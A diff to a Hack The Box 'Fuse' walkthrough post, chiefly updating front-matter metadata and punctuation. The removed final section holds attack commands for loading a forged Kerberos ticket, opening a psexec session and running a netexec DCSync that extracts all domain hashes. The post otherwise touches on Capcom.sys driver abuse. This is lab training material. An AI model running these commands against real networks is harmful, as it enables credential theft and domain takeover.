@@ -1,12 +1,15 @@
 +++
-tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "LDAP", "SeLoadDriverPrivilege", "RPC", "Capcom"]
+title = "Fuse HTB Walkthrough: Active Directory, SeLoadDriverPrivilege, and Capcom Exploitation"
 draft = false
-title = "Fuse HTB Walkthrough"
+tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "LDAP", "SeLoadDriverPrivilege", "RPC", "Capcom"]
+keywords = ["Hack The Box Fuse", "Active Directory exploitation", "SeLoadDriverPrivilege tutorial", "Capcom driver exploitation", "Windows privilege escalation", "LDAP enumeration", "RPC exploitation", "Windows security assessment", "Active Directory penetration testing", "Driver exploitation"]
+description = "A comprehensive walkthrough of the Fuse machine from Hack The Box, covering Active Directory enumeration, SeLoadDriverPrivilege exploitation, Capcom driver vulnerability, and privilege escalation techniques. Learn about service account exploitation, driver loading, and advanced Windows penetration testing methods."
 author = "bloodstiller"
 date = 2024-10-18
 toc = true
 bold = true
 next = true
+lastmod = 2024-10-18
 +++
 
 ## Fuse Hack The Box Walkthrough/Writeup: {#fuse-hack-the-box-walkthrough-writeup}
@@ -209,7 +212,7 @@ next = true
             -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.
 
             -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
-            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:
+            -   Here's a list of functional level numbers and their corresponding Windows Server operating systems:
 
                 | Functional Level Number | Corresponding OS            |
                 |-------------------------|-----------------------------|
@@ -581,7 +584,7 @@ BrandNewPassword69!181128!!!!!
 
 -   **Security Considerations**:
     -   Modern versions of Windows have introduced protections like `Virtualization-based Security (VBS)` and `Hypervisor-Protected Code Integrity (HVCI)` to mitigate the risks posed by vulnerable drivers such as `Capcom.sys`.
-    -   These security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it’s important to note that these features often require newer hardware and can have a performance impact.
+    -   These security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it's important to note that these features often require newer hardware and can have a performance impact.
 
     -   For a deeper dive into the issue of signed vulnerable drivers, you can refer to:
         -   [WeLiveSecurity's article](https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/)
@@ -593,7 +596,7 @@ BrandNewPassword69!181128!!!!!
     -   These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load.
 
 -   For more on how to implement and enforce these rules, check out:
-    -   [Red Canary’s guide on driver block rules](https://redcanary.com/blog/ms-driver-block-rules/)
+    -   [Red Canary's guide on driver block rules](https://redcanary.com/blog/ms-driver-block-rules/)
 
 
 ### Download A Copy of the official `Capcom.sys` Driver: {#download-a-copy-of-the-official-capcom-dot-sys-driver}
@@ -757,49 +760,3 @@ The `ExploitCapcom` tool is the core component of our privilege escalation attac
 
 -   **I sync my clock with the target**:
     -   `sudo ntpdate -s fuse.$domain`
-    -   {{< figure src="/ox-hugo/2024-10-18-145936_.png" >}}
-
--   **I load the ticket into the** `KRB5CCNAME` **variable**:
-    -   `export KRB5CCNAME=./admin.ccache`
-    -   {{< figure src="/ox-hugo/2024-10-18-145947_.png" >}}
-
--   **I verify it works using a** `psexec` **session**:
-    -   `impacket-psexec fuse.$domain -k`
-    -   {{< figure src="/ox-hugo/2024-10-18-145959_.png" >}}
-
-
-### Full DCSync attack using `netexec` and Golden Ticket: {#full-dcsync-attack-using-netexec-and-golden-ticket}
-
--   **Now that we have our Golden ticket we can use it to perform a DCSync attack and extract all the hashes**:
-    -   `netexec smb $box --use-kcache -M ntdsutil`
-    -   {{< figure src="/ox-hugo/2024-10-18-150059_.png" >}}
-
-
-
-## Lessons Learned: {#lessons-learned}
-
-
-### What did I learn? {#what-did-i-learn}
-
-1. I learned that trying to get all your enumeration done very quickly before the password is reset can be frustrating. 
-
-2. I learned that people will always use the description field to hold important information. 
-
-3. I learned that the exploit really did not want to execute the nc64.exe binary no matter how hard I tried. However I think I may have a record for speed-running compiling exploits. 
-
-### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}
-
-1. Had to revert the machine and forgot the hosts. 
-
-
-
-## Sign off: {#sign-off}
-
-Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!
-
-Until next time, hack the planet!
-
-&#x2013; Bloodstiller
-
-&#x2013; Get in touch bloodstiller at proton dot me
-
